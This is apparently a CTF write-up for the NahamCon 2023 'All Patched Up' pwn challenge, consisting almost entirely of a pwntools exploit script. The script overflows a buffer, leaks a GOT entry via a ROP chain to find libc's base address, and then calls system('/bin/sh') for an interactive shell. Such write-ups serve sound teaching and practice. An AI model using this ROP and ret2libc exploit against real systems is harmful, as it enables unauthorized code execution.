---
title: All Patched Up - Unleashing the ROP Chain and Hijacking the GOT - NahamCon 2023
author: megachar0x01
date: 2023-06-18
categories: [Pwn, amd64, ctf]
---

### Purpose : Get The Flag

## Vulnerable Code

<img src="https://i.imgur.com/4Pk6fG1.png" alt="img_1">

## Protection

<img src="https://i.imgur.com/JQEek3u.png" alt="img_2">


## Exploit 

```python
#!/usr/bin/python3
from pwn import *
import struct

# context.terminal = ['tmux','splitw','-h']
os.environ['XDG_CACHE_HOME'] = '/tmp/'

context.log_level = 'error'

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''

break *main+68
continue

continue
'''.format(**locals())

exe = './bin'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)
libc = elf.libc ; 

io = start()


padd = 520

pop_rsi_r15 = 0x0000000000401251


payload = b""
payload += b"A"*padd
payload += p64(pop_rsi_r15) # saved rip
payload += p64(elf.got.write) # pop rsi
payload += p64(0x4242424242424242)  # pop r15

payload += p64(elf.plt.write) # executing plt


payload += p64(elf.sym.main) # redirecting the flow back to main

io.sendlineafter(b">",payload)

""" Leaking got table  """

leak_got_raw=io.recvuntil(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")

""" Formating it to get read address """

leak_got_read = u64( leak_got_raw.split(b"\x00")[4] + b"\x00"*(2) )



print(f"Leaked Read GOT : {hex(leak_got_read)}")

""" Finding libc base address by subtracting read offset """

libc.address = leak_got_read - libc.sym.read

print(f"Libc Base Address : {hex(libc.address)}")

libc_rop = ROP(libc,checksec=False) # Building for rop chain with new libc base

pop_rdi = 0x0000000000023b6a 

payload1 = b""
payload1 += b"A"*padd
payload1 +=  p64(libc.address + pop_rdi ) # rip
payload1 +=  p64(next(libc.search(b"/bin/sh")))

payload1 +=  p64(libc.symbols['system'])

io.sendlineafter(b">",payload1)

io.interactive()


```
